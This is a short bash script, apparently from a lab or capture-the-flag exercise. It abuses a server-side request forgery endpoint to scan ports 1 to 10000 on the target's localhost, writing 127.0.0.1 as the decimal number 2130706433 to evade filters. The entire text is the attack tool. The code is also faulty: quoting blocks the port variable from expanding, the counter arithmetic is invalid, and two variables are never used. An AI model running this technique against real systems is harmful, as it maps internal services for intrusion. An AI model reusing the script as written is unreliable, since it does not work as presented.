#!/bin/bash

url="http://10.10.144.204:8000/attack?url="
param="http%3A%2F%2F2130706433%3A$"
counter=0

for i in {1..10000}; 
	do 
		echo "Working on Port ${i}"
		size=$(curl 'http://10.10.144.204:8000/attack?url=http%3A%2F%2F2130706433%3A${i}' -w '%{size_download}' --silent --output /dev/null)
		if [[ size -gt 1041 ]]
		then
			echo "Target ${i} seems reachable"
			counter=${counter} + 1
		fi
	done

echo ""
echo "There are ${counter} reachable ports"
